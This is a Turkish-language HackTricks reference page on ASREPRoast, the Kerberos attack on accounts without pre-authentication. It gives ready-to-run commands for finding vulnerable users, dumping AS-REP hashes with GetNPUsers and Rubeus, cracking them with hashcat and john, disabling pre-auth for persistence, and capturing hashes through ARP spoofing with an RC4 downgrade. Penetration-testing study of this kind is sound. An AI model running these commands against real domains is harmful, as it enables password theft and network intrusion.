# ASREPRoast

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak katkıda bulunun** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hackleme İçgörüleri**\
Hackleme heyecanını ve zorluklarını inceleyen içeriklerle etkileşime geçin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hackleme dünyasında gerçek zamanlı haberler ve içgörülerle güncel kalın

**En Son Duyurular**\
Yeni ödül avı başlatmaları ve önemli platform güncellemeleri hakkında bilgilenin

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliğine başlayın!

## ASREPRoast

ASREPRoast, **Kerberos ön kimlik doğrulaması gereken özelliğe sahip olmayan kullanıcıları** hedef alan bir güvenlik saldırısıdır. Temelde, bu zafiyet saldırganlara, kullanıcının şifresine ihtiyaç duymadan Bir Alan Denetleyicisinden (DC) bir kullanıcı için kimlik doğrulaması isteme imkanı sağlar. DC daha sonra, saldırganların kullanıcının şifresini keşfetmek için çevrimdışı olarak kırmaya çalışabilecekleri kullanıcının şifresinden türetilmiş anahtarla şifrelenmiş bir ileti ile yanıt verir.

Bu saldırı için ana gereksinimler şunlardır:

* **Kerberos ön kimlik doğrulamasının eksikliği**: Hedef kullanıcıların bu güvenlik özelliğine sahip olmaması gerekir.
* **Alan Denetleyicisine (DC) bağlantı**: Saldırganların istek göndermek ve şifreli iletileri almak için DC'ye erişime ihtiyacı vardır.
* **İsteğe bağlı alan hesabı**: Bir alan hesabına sahip olmak, saldırganların LDAP sorguları aracılığıyla daha verimli bir şekilde savunmasız kullanıcıları tanımlamalarına olanak tanır. Böyle bir hesaba sahip olmayan saldırganlar, kullanıcı adlarını tahmin etmek zorundadır.

#### Savunmasız kullanıcıları sıralama (alan kimlik bilgilerine ihtiyaç duyar)

{% code title="Windows Kullanarak"}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Linux Kullanımı" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS\_REP mesajı isteği

{% code title="Linux Kullanarak" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Windows Kullanımı" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Rubeus ile AS-REP Roasting işlemi, şifreleme türü 0x17 ve ön kimlik doğrulama türü 0 olan bir 4768 oluşturacaktır.
{% endhint %}

### Kırılması
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Kalıcılık

**GenericAll** izinlerine sahip olduğunuz bir kullanıcı için **preauth** zorunlu değilse (veya özellikler yazma izinlerine sahipseniz):

{% code title="Windows Kullanarak" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Linux Kullanımı" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## Kimlik bilgileri olmadan ASREProast

Bir saldırgan, Kerberos ön kimliğin devre dışı bırakılmış olmasına güvenmeden ağ üzerinde dolaşırken AS-REP paketlerini yakalamak için bir adam ortasında konumlanabilir. Bu nedenle, bu yöntem VLAN'daki tüm kullanıcılar için çalışır.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) bize bunu yapma imkanı tanır. Dahası, araç, Kerberos müzakeresini değiştirerek istemci iş istasyonlarının RC4'ü kullanmasını zorlar.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referanslar

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın ve deneyimli hackerlar ve ödül avcıları ile iletişim kurun!

**Hacking Insights**\
Hacking'in heyecanına ve zorluklarına inen içeriklerle etkileşime girin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasında gerçek zamanlı haberler ve içgörülerle güncel kalın

**En Son Duyurular**\
Yeni ödül avı başlatmaları ve önemli platform güncellemeleri hakkında bilgilenin

**Bize Katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliğine başlayın!

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
